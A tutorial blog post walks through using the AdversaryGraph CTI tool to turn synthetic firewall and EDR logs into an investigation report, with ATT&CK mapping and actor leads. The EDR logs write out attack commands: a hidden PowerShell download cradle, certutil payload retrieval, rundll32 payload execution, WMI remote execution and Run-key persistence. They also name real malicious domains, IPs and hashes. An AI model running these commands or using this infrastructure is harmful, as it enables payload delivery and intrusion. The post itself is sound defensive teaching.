# From Log to Report: Using AdversaryGraph to Turn Firewall and EDR Noise Into a CTI Investigation

Most security tools can show alerts.

The harder problem is turning scattered technical evidence into a defensible investigation:

- Which IPs, domains, URLs, and hashes matter?
- Which activity is just noisy infrastructure and which activity looks malicious?
- Which ATT&CK techniques are supported by the evidence?
- Is there any actor or campaign lead?
- Can I turn the result into a client-ready report without manually stitching together five tools?

This article walks through a practical AdversaryGraph use case: **from logs to report**.

The scenario uses synthetic firewall and EDR telemetry seeded with real indicators from an existing CTI dataset related to Mustang Panda / RedDelta-style leads. The logs are not from a real victim environment. They are lab data designed to show the workflow.

> Important: Actor leads are not attribution. In this workflow, AdversaryGraph treats actor names as investigation leads only when source metadata, OpenCTI labels, OTX pulses, or other enrichment sources connect the observable to an alias, report, or campaign context.

---

## About AdversaryGraph

AdversaryGraph is my self-hosted AI-assisted CTI-to-detection workbench.

I built it for the daily analyst workflow where raw evidence, threat intelligence, ATT&CK mapping, IOC enrichment, actor context, and reporting usually live in separate tools. The goal is to keep those steps in one local workflow:

```text
raw evidence -> IOC extraction -> enrichment -> relationship graph -> ATT&CK mapping -> report
```

The platform is designed for:

- CTI analysts who need to turn reports, feeds, and observables into structured intelligence
- SOC analysts who need to triage logs, IOCs, and suspicious infrastructure
- detection engineers who need ATT&CK coverage, Sigma/YARA context, and report-to-detection handoff
- security researchers who want a local workspace for actor, TTP, IOC, and report investigation

Core capabilities include:

- AI report, log, and PCAP-style analysis
- IOC Investigation with Tier 1 / Tier 2 / Tier 3 pivots
- relationship graph for IOC, actor, malware, tag, source, and TTP connections
- local IOC Library with feed synchronization
- VirusTotal, OTX, ThreatFox, Malpedia, urlscan, GreyNoise, AbuseIPDB, Shodan, Censys, MISP, TAXII/STIX, and OpenCTI workflows
- ATT&CK Enterprise, Mobile, ICS, and MITRE ATLAS support
- actor and campaign comparison by TTP overlap
- sector intelligence for customer-specific threat relevance
- AI-assisted report generation with PDF, Markdown, and TXT outputs

AdversaryGraph does not replace analyst judgment. It is a workbench for building a better investigation package faster, while keeping evidence, caveats, and source context visible.

---

## Table of Contents

1. About AdversaryGraph
2. The Investigation Goal
3. Synthetic Firewall Logs
4. Synthetic EDR Logs
5. Step 1: Create a New Investigation
6. Step 2: Analyze Firewall Logs
7. Step 3: Add Firewall Analysis to the Investigation
8. Step 4: Analyze EDR Logs
9. Step 5: Add EDR Analysis to the Investigation
10. Step 6: Extract IOCs and Suspicious Activity
11. Step 7: Investigate Extracted IOCs
12. Step 8: Review the Relationship Graph
13. Step 9: Add IOC Investigation Results to the Investigation
14. Step 10: Map TTP Leads to ATT&CK
15. Step 11: Compare With Threat Actors and Save the Result
16. Step 12: Summarize the Investigation With AI
17. Step 13: Generate the Final Report With the AI Assistant
18. Final Analyst Report Example
19. Why This Workflow Matters

---

## 1. The Investigation Goal

The objective is to simulate what an analyst often receives during an investigation:

- a firewall log showing suspicious outbound C2-like traffic
- EDR telemetry showing suspicious PowerShell, `rundll32`, remote execution, and discovery behavior
- a small set of suspicious hashes
- a few domains and URLs from threat intelligence
- partial actor context from enrichment sources

The goal is to use AdversaryGraph to:

1. Extract all useful observables from the raw logs.
2. Identify suspicious activity and likely ATT&CK techniques.
3. Send extracted IOCs into IOC Investigation.
4. Enrich the IOCs through local DB, OpenCTI, OTX, VirusTotal, urlscan, ThreatFox, and other configured sources.
5. Review relationships, source evidence, actor leads, and TTP leads.
6. Add the reviewed evidence to an Investigation workspace.
7. Produce a structured report with the AI assistant.

---

## 2. Synthetic Firewall Logs

The firewall logs below simulate repeated outbound connections from an internal workstation to suspicious IPs and domains. The source host is fictional. The destination indicators come from the provided IOC set.

```text
2026-06-20T08:14:11Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 proto=tcp app=tls bytes_out=18420 bytes_in=2741 sni=power-sync-services.com action=allow rule=Corp-HTTPS
2026-06-20T08:14:36Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 proto=tcp app=tls bytes_out=19215 bytes_in=2552 sni=power-sync-services.com action=allow rule=Corp-HTTPS
2026-06-20T08:15:02Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 proto=tcp app=tls bytes_out=18790 bytes_in=2601 sni=power-sync-services.com action=allow rule=Corp-HTTPS
2026-06-20T08:17:44Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=443 proto=tcp app=tls bytes_out=8120 bytes_in=940 sni=gatewayrvcenter.com action=allow rule=Corp-HTTPS
2026-06-20T08:18:03Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=166.88.77.186 dst_port=443 proto=tcp app=tls bytes_out=9062 bytes_in=1204 sni=leadingfilipinoteams.com action=allow rule=Corp-HTTPS
2026-06-20T08:22:19Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 proto=tcp app=tls bytes_out=20312 bytes_in=2394 sni=metakit.fireant.vn action=allow rule=Corp-HTTPS
2026-06-20T08:24:31Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=80 proto=tcp app=http url=http://metakit.fireant.vn/Software/version.xml bytes_out=744 bytes_in=2280 action=allow rule=Corp-HTTP
2026-06-20T08:24:35Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=80 proto=tcp app=http url=http://metakit.fireant.vn/Software/setup.exe bytes_out=812 bytes_in=493284 action=allow rule=Corp-HTTP
2026-06-20T08:25:02Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 proto=tcp app=tls bytes_out=23103 bytes_in=2117 sni=oteams.com action=allow rule=Corp-HTTPS
2026-06-20T08:27:18Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=166.88.77.186 dst_port=443 proto=tcp app=tls bytes_out=22018 bytes_in=1880 sni=mxprodesign.com action=allow rule=Corp-HTTPS
2026-06-20T08:31:42Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=443 proto=tcp app=tls bytes_out=24680 bytes_in=1760 sni=m.flach.cn action=allow rule=Corp-HTTPS note=opencti-indicator-alias-reddelta
```

Why this looks suspicious:

- repeated outbound HTTPS from one endpoint
- multiple infrastructure pivots in a short period
- HTTP retrieval of `version.xml` and `setup.exe`
- domains and IPs that already exist in CTI enrichment sources
- OpenCTI metadata connecting `m.flach.cn` to the alias `reddelta`

The important point is not that one firewall event proves anything. It does not.

The value comes from the pattern: repeated outbound communication, download behavior, and CTI-linked infrastructure.

---

## 3. Synthetic EDR Logs

The EDR logs simulate activity on the same workstation after the suspicious outbound traffic.

These logs include realistic attacker tradecraft patterns:

- PowerShell execution
- download cradle behavior
- process discovery
- remote service discovery
- credential-access-adjacent behavior
- DLL execution through `rundll32`
- masqueraded file names
- suspicious hashes from the provided IOC set

```text
2026-06-20T08:24:38Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=WINWORD.EXE process=powershell.exe pid=7412 cmd="powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri http://metakit.fireant.vn/Software/setup.exe -OutFile C:\\ProgramData\\Microsoft\\setup.exe"
2026-06-20T08:24:51Z EDR file_create host=FIN-WS-042 path=C:\\ProgramData\\Microsoft\\setup.exe sha256=eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f md5=fd2c2f1bf90592604febf404e5579f89 signer=unsigned
2026-06-20T08:25:07Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=powershell.exe process=setup.exe pid=7560 cmd="C:\\ProgramData\\Microsoft\\setup.exe /silent /update"
2026-06-20T08:25:31Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=setup.exe process=cmd.exe pid=7624 cmd="cmd.exe /c whoami /all && hostname && ipconfig /all"
2026-06-20T08:26:04Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=setup.exe process=net.exe pid=7681 cmd="net.exe view /domain"
2026-06-20T08:26:12Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=setup.exe process=nltest.exe pid=7710 cmd="nltest.exe /dclist:corp.local"
2026-06-20T08:26:44Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=setup.exe process=tasklist.exe pid=7792 cmd="tasklist.exe /v"
2026-06-20T08:27:20Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=setup.exe process=rundll32.exe pid=7841 cmd="rundll32.exe C:\\ProgramData\\Microsoft\\msupdate.dat,StartW"
2026-06-20T08:27:23Z EDR image_load host=FIN-WS-042 process=rundll32.exe image=C:\\ProgramData\\Microsoft\\msupdate.dat sha1=f8f8209987ca7f139de6a62f9e6ee21bd2ae93a9 sha256=2bfaf9773b7fac658ab439b9b763a92e144e5388301ca03021ef56501be3036a signer=unsigned
2026-06-20T08:28:02Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=rundll32.exe process=powershell.exe pid=7928 cmd="powershell.exe -NoP -W Hidden -Command $p='http://power-sync-services.com/update/check'; iwr $p -UseBasicParsing"
2026-06-20T08:29:10Z EDR network_connect host=FIN-WS-042 process=rundll32.exe dst=103.119.47.104 dst_port=443 domain=power-sync-services.com sha1=f74f1feb62b662cda489fdb2453727824e55acb9
2026-06-20T08:31:19Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=rundll32.exe process=sc.exe pid=8011 cmd="sc.exe \\\\FIN-FS-01 query"
2026-06-20T08:32:03Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=rundll32.exe process=wmic.exe pid=8122 cmd="wmic.exe /node:FIN-FS-01 process call create \"cmd.exe /c whoami\""
2026-06-20T08:35:44Z EDR file_create host=FIN-WS-042 path=C:\\ProgramData\\Microsoft\\cache.bin sha1=b7b2d2db544f9eea74453cdf2b8beea58cf07c48 signer=unsigned
2026-06-20T08:36:12Z EDR process_start host=FIN-WS-042 user=FINANCE\\apark parent=rundll32.exe process=certutil.exe pid=8282 cmd="certutil.exe -urlcache -split -f http://gatewayrvcenter.com/payload.dat C:\\ProgramData\\Microsoft\\cache.bin"
2026-06-20T08:37:55Z EDR registry_set host=FIN-WS-042 process=rundll32.exe key=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run value=OneDriveSync data=C:\\ProgramData\\Microsoft\\setup.exe
```

This EDR sequence creates several investigation questions:

- Did the endpoint download a malicious file?
- Are the hashes already known in CTI sources?
- Is PowerShell being used as a download mechanism?
- Is `rundll32` executing an unsigned payload?
- Does the behavior indicate discovery, ingress tool transfer, command-and-control, or lateral movement?
- Do the domains or IPs connect to a known actor lead?

This is exactly where AdversaryGraph becomes useful.

---

## 4. Step 1: Create a New Investigation

Start from the case workspace, not from raw analysis.

Open:

```text
Investigation
```

Create a new investigation before running analysis. This gives every later result a destination:

- firewall log analysis
- EDR log analysis
- IOC Investigation results
- TTP layer
- actor-comparison output
- AI summary
- final report

This avoids disconnected analysis results and keeps the whole case auditable.

---

## 5. Step 2: Analyze Firewall Logs

Open AdversaryGraph and go to:

```text
AI Analysis
```

Select:

```text
Log / PCAP
```

Paste or upload only the firewall logs first.

Do not write a manual prompt. The Log / PCAP mode already uses an internal AdversaryGraph system prompt that instructs the model to:

- extract IOCs
- identify suspicious activity
- map behavior to ATT&CK
- separate source evidence from enrichment leads
- avoid attribution claims
- return a structured analyst result

Run the analysis.

---

## 6. Step 3: Add Firewall Analysis to the Investigation

After the firewall analysis completes, click:

```text
Add to investigation
```

Choose the investigation created in Step 1.

This saves the firewall result as structured case evidence.

---

## 7. Step 4: Analyze EDR Logs

Return to:

```text
AI Analysis -> Log / PCAP
```

Paste or upload the EDR logs as a separate analysis.

Do not combine firewall and EDR logs in one run unless you intentionally want one mixed result. The cleaner workflow is one source per run:

- firewall logs -> one analysis result
- EDR logs -> second analysis result
- each result -> added to the same investigation

This makes the final report easier to audit because every conclusion can be traced back to the source that produced it.

---

## 8. Step 5: Add EDR Analysis to the Investigation

After the EDR analysis completes, click:

```text
Add to investigation
```

Choose the same investigation.

At this point the investigation should contain at least two evidence nodes:

- firewall log analysis result
- EDR log analysis result

---

## 9. Step 6: Extract IOCs and Suspicious Activity

The AI analyst results should extract structured evidence from each log source.

Expected IOC extraction:

| Type | Indicator |
|---|---|
| IP | `103.119.47.104` |
| IP | `38.60.245.37` |
| IP | `166.88.77.186` |
| Domain | `power-sync-services.com` |
| Domain | `gatewayrvcenter.com` |
| Domain | `metakit.fireant.vn` |
| Domain | `leadingfilipinoteams.com` |
| Domain | `oteams.com` |
| Domain | `mxprodesign.com` |
| Domain | `m.flach.cn` |
| URL | `http://metakit.fireant.vn/Software/version.xml` |
| URL | `http://metakit.fireant.vn/Software/setup.exe` |
| URL | `http://power-sync-services.com/update/check` |
| SHA256 | `eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f` |
| SHA256 | `2bfaf9773b7fac658ab439b9b763a92e144e5388301ca03021ef56501be3036a` |
| SHA1 | `f8f8209987ca7f139de6a62f9e6ee21bd2ae93a9` |
| SHA1 | `f74f1feb62b662cda489fdb2453727824e55acb9` |
| SHA1 | `b7b2d2db544f9eea74453cdf2b8beea58cf07c48` |
| MD5 | `fd2c2f1bf90592604febf404e5579f89` |

Expected suspicious behaviors:

| Evidence | Why It Matters |
|---|---|
| `WINWORD.EXE` spawning `powershell.exe` | Office-to-script execution chain |
| PowerShell downloading `setup.exe` | Ingress tool transfer pattern |
| `setup.exe` unsigned in `C:\ProgramData\Microsoft\` | Masquerading and suspicious staging path |
| `whoami /all`, `hostname`, `ipconfig /all` | Host and account discovery |
| `net view /domain`, `nltest /dclist` | Domain and network discovery |
| `tasklist /v` | Process discovery |
| `rundll32.exe ... msupdate.dat,StartW` | DLL/proxy execution through signed Windows binary |
| `wmic /node ... process call create` | Remote execution / lateral movement lead |
| `certutil -urlcache -split -f` | File retrieval using a signed Windows utility |
| Run key persistence | User-level persistence |

Expected ATT&CK technique leads:

| Technique | Name | Evidence |
|---|---|---|
| T1059 | Command and Scripting Interpreter | PowerShell and cmd execution |
| T1059.001 | PowerShell | PowerShell download commands |
| T1105 | Ingress Tool Transfer | Download of `setup.exe` and `payload.dat` |
| T1071.001 | Web Protocols | HTTP/HTTPS C2-like traffic |
| T1082 | System Information Discovery | `hostname`, `ipconfig`, `whoami` context |
| T1057 | Process Discovery | `tasklist /v` |
| T1016 | System Network Configuration Discovery | `ipconfig /all` |
| T1482 | Domain Trust Discovery | `nltest /dclist` and domain discovery |
| T1021 | Remote Services | Remote access/lateral movement lead |
| T1047 | Windows Management Instrumentation | `wmic /node ... process call create` |
| T1218.011 | Rundll32 | `rundll32.exe` executing a suspicious payload |
| T1036 | Masquerading | `setup.exe`, `msupdate.dat`, Microsoft-looking path |
| T1053 / T1547.001 | Persistence lead | Run key persistence |

Not every technique is equally strong.

For example, T1059 and T1071.001 are high-frequency techniques. They are useful for behavior mapping but weak for attribution. `rundll32`, WMI remote execution, and source-linked IOC relationships may be more useful as investigation pivots.

---

## 10. Step 7: Investigate Extracted IOCs

After the AI analysis extracts IOCs, send the strongest indicators to:

```text
IOC Investigation
```

Start with:

```text
103.119.47.104
```

Then investigate:

```text
power-sync-services.com
metakit.fireant.vn
m.flach.cn
eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f
```

Use:

```text
Tier 1 + Tier 2 + Tier 3
```

Enable AI summary if you want a report-ready paragraph.

AdversaryGraph will query configured sources such as:

- local IOC database
- OpenCTI
- AlienVault OTX
- VirusTotal
- ThreatFox
- urlscan.io
- GreyNoise
- AbuseIPDB
- Shodan
- Censys
- MalwareBazaar
- custom feeds
- MISP / STIX / TAXII imports

What we expect from this dataset:

- `m.flach.cn` may show source metadata matching the actor alias `reddelta`
- OTX records may produce the pulse context around `APT32`, `phoreal`, `fireant metakit`, `soundbite`, supply-chain targeting, and stock-investor lures
- the IPs and domains should cluster around the same IOC set
- the hashes should connect to the same campaign-like context when enrichment data exists
- ATT&CK leads should include T1021, T1027, T1036, T1041, T1055, T1059, T1071.001, T1082, T1105, and T1190

Again: this is not attribution. It is source-backed clustering and lead generation.

---

## 11. Step 8: Review the Relationship Graph

In the IOC Investigation result, open the relationship graph.

The graph should help answer:

- Which indicators are directly related to the submitted IOC?
- Which relationships are source-backed?
- Which nodes are context only?
- Which actor names are leads?
- Which TTPs are mapped from source evidence?
- Which pivots deserve another investigation run?

For this case, useful graph nodes may include:

- `103.119.47.104`
- `38.60.245.37`
- `166.88.77.186`
- `power-sync-services.com`
- `metakit.fireant.vn`
- `m.flach.cn`
- `reddelta`
- `APT32`
- `phoreal`
- `fireant metakit`
- `soundbite`
- selected hashes
- ATT&CK technique leads

When selecting a node, AdversaryGraph explains:

- what the node means
- why it is connected
- whether the evidence suggests maliciousness
- whether any TTP is attached
- whether any actor lead is attached
- which source produced the relationship

This is useful because the analyst can distinguish:

- a direct IOC relationship
- a weak tag relationship
- a source-backed actor alias match
- a high-frequency TTP
- a more distinctive behavior lead

---

## 12. Step 9: Add IOC Investigation Results to the Investigation

After reviewing IOC Investigation output, add the useful result to the same investigation:

- AI log analysis result
- extracted IOC list
- IOC Investigation result
- relationship graph evidence
- ATT&CK TTP leads
- actor comparison leads
- source conflicts and timeline notes

The investigation workspace should now keep the case organized into practical sections:

- Logs - result analysis
- Report analysis
- founded TTP layer
- IOC list
- evidence nodes and relationships
- timeline entries

This matters because the final report should not be generated from one isolated screen. It should use the reviewed investigation package: firewall analysis, EDR analysis, IOC enrichment, TTP evidence, graph relationships, and analyst caveats.

---

## 13. Step 10: Map TTP Leads to ATT&CK

After IOC Investigation identifies TTP leads, use the Investigation action:

```text
Put TTPs on matrix
```

This creates a Navigator-like layer from all TTPs saved in the active investigation, not only the current screen.

Then add or keep the relevant techniques in:

```text
My TTPs
```

For this case, the expected matrix coverage should include:

- Initial Access / Exploit Public-Facing Application: T1190 as a source-provided campaign lead
- Execution / Command and Scripting Interpreter: T1059
- Execution / PowerShell: T1059.001
- Defense Evasion / Masquerading: T1036
- Defense Evasion / Rundll32: T1218.011
- Discovery / System Information Discovery: T1082
- Discovery / Process Discovery: T1057
- Discovery / System Network Configuration Discovery: T1016
- Discovery / Domain Trust Discovery: T1482
- Command and Control / Application Layer Protocol Web Protocols: T1071.001
- Command and Control / Ingress Tool Transfer: T1105
- Lateral Movement / Remote Services: T1021
- Execution / Windows Management Instrumentation: T1047
- Collection / Exfiltration lead: T1041 if supported by traffic volume and destination context

At this stage, AdversaryGraph can compare the selected TTP set against known actor profiles and report history.

That comparison should be treated as a triage aid:

- low overlap means weak relationship or missing documentation
- moderate overlap means worth reviewing
- high overlap means prioritize deeper investigation

It still does not prove attribution.

---

## 14. Step 11: Compare With Threat Actors and Save the Result

From the Investigation page, run:

```text
Compare + save result
```

AdversaryGraph compares the investigation TTP layer against actor profiles and saves the top overlap leads back into the investigation as structured evidence.

The saved comparison includes:

- compared TTP count
- top actor profile leads
- similarity score
- shared technique count
- shared technique IDs
- timestamped timeline entry

This comparison is useful for prioritization. It is not attribution.

---

## 15. Step 12: Summarize the Investigation With AI

After log analysis, IOC investigation, TTP mapping, and actor comparison are saved, run:

```text
Complete AI analysis
```

The AI summary uses the active Investigation workspace as context. It should summarize:

- current assessment
- strongest evidence
- IOC findings
- TTP layer
- actor-comparison leads
- source caveats
- recommended next actions

The summary is also saved back into the investigation as an evidence node.

---

## 16. Step 13: Generate the Final Report With the AI Assistant

Open:

```text
Investigation
```

Select the sections to include:

- active Investigation workspace context
- Navigator / selected TTPs
- TTP evidence
- actor comparison
- relevant IOC enrichment
- source timeline
- source conflicts
- relationship graph summary

Then choose one of the two report modes:

1. Local report generation based on selected platform data.
2. AI assistant report generation using selected parameters and evidence.

For this workflow, the AI assistant report should receive:

- the original firewall logs
- the original EDR logs
- AI log analysis result
- extracted IOCs
- IOC Investigation summaries
- relationship graph leads
- saved evidence nodes and source timeline
- ATT&CK mapping
- actor comparison output
- AI investigation summary
- caveats and confidence statements

No manual report prompt is required. The report assistant should use the active investigation context and AdversaryGraph's built-in report instructions to produce a structured report with direct evidence, enrichment leads, caveats, source conflicts, and recommended next steps.

Export as:

- PDF
- Markdown
- TXT

---

## 17. Final Analyst Report Example

### Executive Summary

AdversaryGraph reviewed synthetic firewall and EDR telemetry for host `FIN-WS-042`. The activity shows a suspicious execution chain beginning with Office-spawned PowerShell, followed by external payload retrieval, execution of unsigned binaries from `C:\ProgramData\Microsoft\`, host and domain discovery commands, `rundll32` execution, remote execution attempts through WMI, and repeated outbound communication to CTI-linked infrastructure.

The activity is assessed as malicious in this lab scenario because multiple independent evidence types align:

- suspicious process lineage
- payload download behavior
- known IOC overlap
- repeated C2-like outbound traffic
- unsigned staged files
- discovery commands
- source-backed enrichment relationships
- ATT&CK technique clustering

### Key Observables

| Type | Indicator | Notes |
|---|---|---|
| IP | `103.119.47.104` | Repeated outbound HTTPS and enrichment-linked IOC |
| IP | `38.60.245.37` | HTTP/HTTPS connections and payload retrieval context |
| IP | `166.88.77.186` | Additional infrastructure pivot |
| Domain | `power-sync-services.com` | C2-like repeated outbound destination |
| Domain | `metakit.fireant.vn` | Source of `version.xml` and `setup.exe` in synthetic logs |
| Domain | `m.flach.cn` | OpenCTI source metadata matched alias `reddelta` |
| SHA256 | `eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f` | Downloaded unsigned staged file |
| SHA256 | `2bfaf9773b7fac658ab439b9b763a92e144e5388301ca03021ef56501be3036a` | Loaded by `rundll32` as `msupdate.dat` |
| MD5 | `fd2c2f1bf90592604febf404e5579f89` | Hash associated with downloaded payload |

### ATT&CK Technique Leads

| Technique | Name | Evidence |
|---|---|---|
| T1059.001 | PowerShell | PowerShell download and execution commands |
| T1105 | Ingress Tool Transfer | `setup.exe` and `payload.dat` retrieval |
| T1071.001 | Web Protocols | HTTP/HTTPS outbound traffic to suspicious domains |
| T1082 | System Information Discovery | `whoami`, `hostname`, `ipconfig` |
| T1057 | Process Discovery | `tasklist /v` |
| T1482 | Domain Trust Discovery | `nltest /dclist` |
| T1218.011 | Rundll32 | `rundll32.exe` loading `msupdate.dat` |
| T1036 | Masquerading | Microsoft-looking staging path and names |
| T1047 | Windows Management Instrumentation | `wmic /node ... process call create` |
| T1021 | Remote Services | Remote service and lateral movement lead |
| T1547.001 | Registry Run Keys / Startup Folder | Run key persistence |

### Actor and Campaign Leads

The investigation produced actor-related leads from enrichment metadata:

- `m.flach.cn` source metadata matched alias `reddelta`
- the provided IOC set contains repeated OTX pulse context including `APT32`, `phoreal`, `fireant metakit`, and `soundbite`
- the same record set carries Mustang Panda-related context from the user-provided source material

These are leads only. They should be validated against original reports, source confidence, malware family evidence, infrastructure overlap, timing, victimology, and toolmarks before any attribution statement.

### Recommended Next Steps

1. Isolate `FIN-WS-042`.
2. Block the extracted IPs, domains, and URLs at egress controls.
3. Hunt for the listed hashes across EDR and file inventory.
4. Search for `rundll32.exe` loading `.dat` files from user-writable or ProgramData paths.
5. Hunt for Office-to-PowerShell process chains.
6. Hunt for WMI remote execution attempts from the affected host.
7. Review DNS, proxy, and firewall logs for additional hosts contacting the same infrastructure.
8. Use AdversaryGraph to compare the selected TTPs with actor profiles, but treat overlap as a hypothesis lead.
9. Export the final report as PDF and attach raw evidence separately.

---

## 18. Why This Workflow Matters

This use case is important because it shows AdversaryGraph working as an investigation bridge:

```text
Create investigation -> firewall log analysis -> add result -> EDR log analysis -> add result -> IOC Investigation -> add IOC result -> TTP layer on matrix -> actor comparison -> AI summary -> investigation report
```

The value is not only enrichment.

The value is the structured workflow:

- raw telemetry becomes IOCs
- IOCs become relationships
- relationships become evidence-ranked leads
- reviewed leads become a structured investigation workspace
- evidence becomes ATT&CK mapping
- ATT&CK mapping becomes a report
- the report keeps caveats clear

For CTI analysts, SOC teams, and detection engineers, this is the practical difference between “we have suspicious logs” and “we have a defensible investigation package.”

AdversaryGraph does not replace analyst validation.

It gives the analyst a faster way to build the case.

---

## Follow My Work

AdversaryGraph is part of my broader 1200km cybersecurity research ecosystem: practical CTI workflows, detection engineering notes, malware-analysis projects, OpenCTI work, cloud and Kubernetes security research, AI-assisted security tooling, labs, and technical guides.

- AdversaryGraph platform page: https://1200km.com/adversarygraph/
- AdversaryGraph documentation: https://1200km.com/adversarygraph-docs/
- AdversaryGraph GitHub: https://github.com/anpa1200/adversarygraph
- 1200km portfolio / knowledge base: https://1200km.com/
- Medium: https://medium.com/@1200km
- GitHub: https://github.com/anpa1200
- LinkedIn: https://www.linkedin.com/in/andrey-pautov/

Andrey Pautov
